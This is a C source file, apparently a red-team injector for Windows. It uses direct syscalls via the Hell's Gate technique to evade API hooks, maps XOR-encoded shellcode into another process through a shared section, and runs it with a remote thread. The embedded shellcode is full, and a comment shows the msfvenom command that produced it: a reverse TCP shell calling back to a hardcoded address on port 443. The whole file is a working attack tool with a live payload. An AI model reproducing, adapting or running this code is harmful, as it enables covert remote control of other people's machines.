#include "header.h"
#pragma comment(lib, "onecore.lib")

#define KEY "FHTW"

// Process Injection 
BOOL Inject(IN PVX_TABLE pTable, IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSize) {

	NTSTATUS STATUS = NULL; 
	BOOL bState = TRUE;
	
	HANDLE hFile = NULL; 
	HANDLE hSection = NULL;
	LARGE_INTEGER MaximumSize = {
		.HighPart = 0,
		.LowPart = sSize
	};
	PVOID pLocalAddress = NULL;
	PVOID pRemoteAddress = NULL;
	SIZE_T sViewSize = NULL;
	HANDLE hThread = NULL;

	// Create mapping
	// https://ntdoc.m417z.com/ntcreatesection
	PrepareSyscall(pTable->NtCreateSection.wSystemCall); 
	STATUS = RunSyscall(&hSection, (SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE), NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	if (STATUS != STATUS_SUCCESS) {
		PRINT_NTERROR("NtCreateSection"); 
		bState = FALSE;
		goto CLEANUP; 
	}
	OKAY("[ 0x%p ] [RWX] Created section.", hSection);

	// Map view of payload into local process address space
	// https://ntdoc.m417z.com/ntmapviewofsection
	PrepareSyscall(pTable->NtMapViewOfSection.wSystemCall); 
	STATUS = RunSyscall(hSection, (HANDLE)-1, &pLocalAddress, NULL, NULL, NULL, &sViewSize, ViewUnmap, NULL, PAGE_READWRITE);
	if (STATUS != STATUS_SUCCESS) {
		PRINT_NTERROR("NtMapViewOfSection");
		bState = FALSE;
		goto CLEANUP; 
	}
	OKAY("[ 0x%p ] [RW-] Mapped %d bytes into local process address space.", pLocalAddress, sViewSize);

	// Decrypt payload in local process, which decrypts the payload in the remote process aswell
	SIZE_T sKeyLength = strlen(KEY);
	for (int i = 0; i < sSize; i++) {
		pShellcode[i] ^= KEY[i % sKeyLength];
	}
	OKAY("[ 0x%p ] Decoded payload with key \"%s\".", pShellcode, KEY);

	// Copy memory to the local address 
	RtlCopyMemory(pLocalAddress, pShellcode, sSize);

	// Map view of payload into target process address space
	// https://ntdoc.m417z.com/ntmapviewofsection
	PrepareSyscall(pTable->NtMapViewOfSection.wSystemCall);
	STATUS = RunSyscall(hSection, hProcess, &pRemoteAddress, NULL, NULL, NULL, &sViewSize, ViewUnmap, NULL, PAGE_EXECUTE);
	if (STATUS != STATUS_SUCCESS) {
		PRINT_NTERROR("NtMapViewOfSection [2]");
		bState = FALSE;
		goto CLEANUP;
	}
	OKAY("[ 0x%p ] [--X] Mapped payload into target process address space.", pRemoteAddress);

	// Create new thread
	// https://ntdoc.m417z.com/ntcreatethreadex
	PrepareSyscall(pTable->NtCreateThreadEx.wSystemCall); 
	STATUS = RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (PTHREAD_START_ROUTINE)pRemoteAddress, NULL, NULL, NULL, NULL, NULL, NULL); 
	if (STATUS != STATUS_SUCCESS) {
		PRINT_NTERROR("NtCreateThreadEx"); 
		bState = FALSE;
		goto CLEANUP; 
	}
	OKAY("[ 0x%p ] Thread created.", hThread);

	// Wait for execution
	// https://ntdoc.m417z.com/ntwaitforsingleobject
	PrepareSyscall(pTable->NtWaitForSingleObject.wSystemCall); 
	STATUS = RunSyscall(hThread, FALSE, NULL); 
	if (STATUS != STATUS_SUCCESS) {
		PRINT_NTERROR("NtWaitForSingleObject"); 
		bState = FALSE;
		goto CLEANUP; 
	}

CLEANUP:

	// Close handles
	// https://ntdoc.m417z.com/ntclose
	if (hSection) {
		PrepareSyscall(pTable->NtClose.wSystemCall); 
		STATUS = RunSyscall(hSection); 
		if (STATUS != STATUS_SUCCESS) {
			PRINT_ERROR("NtClose"); 
			bState = FALSE;
		}
	}

	if (hThread) {
		PrepareSyscall(pTable->NtClose.wSystemCall);
		STATUS = RunSyscall(hThread);
		if (STATUS != STATUS_SUCCESS) {
			PRINT_NTERROR("NtClose");
			bState = FALSE;
		}
	}

	// Unmap views
	// https://ntdoc.m417z.com/ntunmapviewofsection
	if (pLocalAddress) {
		PrepareSyscall(pTable->NtUnmapViewOfSection.wSystemCall); 
		STATUS = RunSyscall((HANDLE)-1, pLocalAddress); 
		if (STATUS != STATUS_SUCCESS) {
			PRINT_NTERROR("NtUnmapViewOfSection"); 
			bState = FALSE;
		}
		else {
			OKAY("Unmapped view in local process address space."); 
		}
	}

	if (pRemoteAddress) {
		PrepareSyscall(pTable->NtUnmapViewOfSection.wSystemCall);
		STATUS = RunSyscall(hProcess, pRemoteAddress);
		if (STATUS != STATUS_SUCCESS) {
			PRINT_NTERROR("NtUnmapViewOfSection [2]");
			bState = FALSE;
		}
		else {
			OKAY("Unmapped view in remote process address space.");
		}
	}

	return bState;
}

int main(int argc, char* argv[]) {

	// Calculate API hashes
	// PrintHashes(); 

	DWORD dwPid = NULL;
	HANDLE hProcess = NULL;

	NTSTATUS STATUS = NULL;
	VX_TABLE Table = { 0 };

	// msfvenom - p windows/x64/shell_reverse_tcp LHOST=192.168.168.129 LPORT=443 EXITFUNC=thread -a x64 --platform windows -f raw -o rev.bin
	// python3 encoder.py
	unsigned char pShellcode[] = {
		0xBA,0x00,0xD7,0xB3,0xB6,0xA0,0x94,0x57,0x46,0x48,0x15,0x06,0x07,0x18,0x06,
		0x06,0x10,0x00,0x65,0x85,0x23,0x00,0xDF,0x05,0x26,0x00,0xDF,0x05,0x5E,0x00,
		0xDF,0x05,0x66,0x00,0xDF,0x25,0x16,0x00,0x5B,0xE0,0x0C,0x02,0x19,0x66,0x8F,
		0x00,0x65,0x97,0xEA,0x74,0x35,0x2B,0x44,0x64,0x74,0x16,0x87,0x81,0x59,0x16,
		0x47,0x89,0xB6,0xBA,0x14,0x09,0x05,0x1F,0xCD,0x1A,0x74,0xDC,0x04,0x74,0x1C,
		0x56,0x96,0xC3,0xD4,0xDF,0x46,0x48,0x54,0x1F,0xC3,0x88,0x20,0x30,0x0E,0x49,
		0x84,0x07,0xCD,0x00,0x4C,0x13,0xCD,0x08,0x74,0x1E,0x47,0x98,0xB7,0x01,0x0E,
		0xB7,0x9D,0x16,0xCD,0x7C,0xDC,0x1F,0x47,0x9E,0x19,0x66,0x8F,0x00,0x65,0x97,
		0xEA,0x09,0x95,0x9E,0x4B,0x09,0x55,0x96,0x7E,0xA8,0x21,0xA6,0x0A,0x4B,0x18,
		0x73,0x4E,0x0D,0x6D,0x86,0x33,0x90,0x0C,0x13,0xCD,0x08,0x70,0x1E,0x47,0x98,
		0x32,0x16,0xCD,0x44,0x1C,0x13,0xCD,0x08,0x48,0x1E,0x47,0x98,0x15,0xDC,0x42,
		0xC0,0x1C,0x56,0x96,0x09,0x0C,0x16,0x1E,0x16,0x0D,0x0D,0x07,0x10,0x15,0x0E,
		0x07,0x12,0x1C,0xD4,0xAA,0x68,0x15,0x05,0xB9,0xA8,0x0C,0x16,0x1F,0x12,0x1C,
		0xDC,0x54,0xA1,0x03,0xA8,0xB9,0xB7,0x09,0x1E,0xF8,0x3F,0x27,0x65,0x19,0x7B,
		0x66,0x57,0x46,0x09,0x02,0x1E,0xCF,0xAE,0x1C,0xD6,0xAA,0xE8,0x55,0x57,0x46,
		0x01,0xDD,0xB2,0x0F,0xF4,0x56,0x57,0x47,0xF3,0x94,0xFF,0xEE,0xC9,0x15,0x03,
		0x0F,0xC1,0xB0,0x1B,0xCF,0xB9,0x15,0xED,0x0A,0x3F,0x72,0x50,0xB9,0x9D,0x18,
		0xDE,0xAC,0x20,0x55,0x56,0x46,0x48,0x0D,0x16,0xFC,0x61,0xD4,0x3C,0x46,0xB7,
		0x81,0x07,0x16,0x05,0x65,0x9E,0x0B,0x79,0x94,0x1F,0xB9,0x88,0x1C,0xDE,0x84,
		0x00,0xAB,0x97,0x0E,0xC1,0x95,0x16,0xFC,0xA2,0x5B,0x88,0xA6,0xB7,0x81,0x1F,
		0xCF,0x8F,0x3E,0x47,0x07,0x10,0x18,0xDE,0xA4,0x00,0xDD,0xAE,0x07,0xF2,0xCD,
		0xF2,0x32,0x29,0xAB,0x82,0x0E,0xC9,0x90,0x17,0x44,0x48,0x54,0x1E,0xFE,0x2B,
		0x39,0x33,0x46,0x48,0x54,0x57,0x46,0x09,0x04,0x16,0x16,0x00,0xDD,0xB5,0x11,
		0x1F,0x03,0x1A,0x77,0x88,0x3E,0x5A,0x1F,0x09,0x04,0xB5,0xBA,0x2E,0x93,0x13,
		0x62,0x1C,0x55,0x56,0x0E,0xC5,0x10,0x73,0x5E,0x8E,0x54,0x3F,0x0E,0xC1,0xB2,
		0x01,0x16,0x09,0x04,0x16,0x16,0x09,0x04,0x1E,0xB9,0x88,0x15,0x07,0x0F,0xB7,
		0x9C,0x1A,0xCF,0x89,0x18,0xDE,0x87,0x09,0xEE,0x2E,0x8A,0x77,0xD2,0xA8,0x93,
		0x00,0x65,0x85,0x0E,0xB7,0x9E,0xDC,0x48,0x09,0xEE,0x5F,0xC1,0x55,0x34,0xA8,
		0x93,0xF3,0xB4,0x4A,0x6C,0x42,0x15,0xED,0xE0,0xDD,0xE9,0xCA,0xB9,0x9D,0x1C,
		0xD4,0x82,0x60,0x68,0x51,0x3A,0x42,0xD4,0xAC,0xA6,0x3D,0x51,0xEC,0x01,0x5B,
		0x26,0x38,0x2C,0x48,0x0D,0x16,0xCF,0x92,0xAB,0x82
	};

	// Handle command line arguments
	if (argc < 2) {
		printf("Usage: %s <pid>\n", argv[0]);
		return EXIT_FAILURE;
	}
	dwPid = atoi(argv[1]);

	// Initialize Direct Syscalls
	if (!InitializeDirectSyscalls(&Table)) {
		PRINT_ERROR("InitializeDirectSyscalls");
		return EXIT_FAILURE;
	}
	OKAY("Direct syscalls table initialized via Hell's Gate technique.");

	// Get handle to remote process
	// https://ntdoc.m417z.com/ntopenprocess
	OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
	CLIENT_ID cId = { ULongToHandle(dwPid) };

	PrepareSyscall(Table.NtOpenProcess.wSystemCall);
	STATUS = RunSyscall(&hProcess, PROCESS_ALL_ACCESS, &OA, &cId);
	if (STATUS != STATUS_SUCCESS) {
		PRINT_NTERROR("NtOpenProcess");
		return EXIT_FAILURE;
	}
	OKAY("[ 0x%p ] [ %d ] Process opened.", hProcess, dwPid);

	// Inject 
	if (!Inject(&Table, hProcess, pShellcode, sizeof(pShellcode))) {
		PRINT_ERROR("Inject");
		return EXIT_FAILURE;
	}

	if (hProcess) {
		CloseHandle(hProcess);
	}

	return EXIT_SUCCESS;
}

BOOL InitializeDirectSyscalls(IN PVX_TABLE Table) {

	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return FALSE;

	// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return FALSE;

	Table->NtOpenProcess.dwHash = NtOpenProcess_HASH;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->NtOpenProcess)) {
		PRINT_ERROR("GetVxTableEntry [NtOpenProcess]");
		return FALSE;
	}

	Table->NtCreateSection.dwHash = NtCreateSection_HASH;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->NtCreateSection)) {
		PRINT_ERROR("GetVxTableEntry [NtCreateSection]");
		return FALSE;
	}

	Table->NtMapViewOfSection.dwHash = NtMapViewOfSection_HASH;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->NtMapViewOfSection)) {
		PRINT_ERROR("GetVxTableEntry [NtMapViewOfSection]");
		return FALSE;
	}

	Table->NtUnmapViewOfSection.dwHash = NtUnmapViewOfSection_HASH;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->NtUnmapViewOfSection)) {
		PRINT_ERROR("GetVxTableEntry [NtUnmapViewOfSection]");
		return FALSE;
	}

	Table->NtCreateThreadEx.dwHash = NtCreateThreadEx_HASH;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->NtCreateThreadEx)) {
		PRINT_ERROR("GetVxTableEntry [NtCreateThreadEx]");
		return FALSE;
	}

	Table->NtWaitForSingleObject.dwHash = NtWaitForSingleObject_HASH;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->NtWaitForSingleObject)) {
		PRINT_ERROR("GetVxTableEntry [NtWaitForSingleObject]");
		return FALSE;
	}

	Table->NtClose.dwHash = NtClose_HASH;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->NtClose)) {
		PRINT_ERROR("GetVxTableEntry [NtClose]");
		return FALSE;
	}
}